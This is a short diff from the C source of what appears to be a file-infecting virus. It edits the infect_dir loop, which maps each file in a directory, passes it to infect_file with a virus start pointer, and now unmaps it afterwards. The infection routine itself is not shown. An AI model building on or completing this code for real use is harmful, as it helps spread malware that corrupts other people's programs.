@@ -68,11 +68,12 @@ void		infect_dir(char *dir_path, uint8_t *start_virus)
 		// printf("Mapped\n");
 
 		if ((mem_file = infect_file(mem_file, stat.st_size, start_virus)) != NULL)
-			// save_file();
+		{
 			printf("Infection routine done !\n");
-
-		// infect_file();// TODO handle munmap in infect_file
-		// 	save_file(dir_entry->d_name, mem_file);
+			// save_file(dir_entry->d_name, mem_file);
+			// TODO handle size change when extend
+			munmap(mem_file, file_size);
+		}
 	}
 }
 
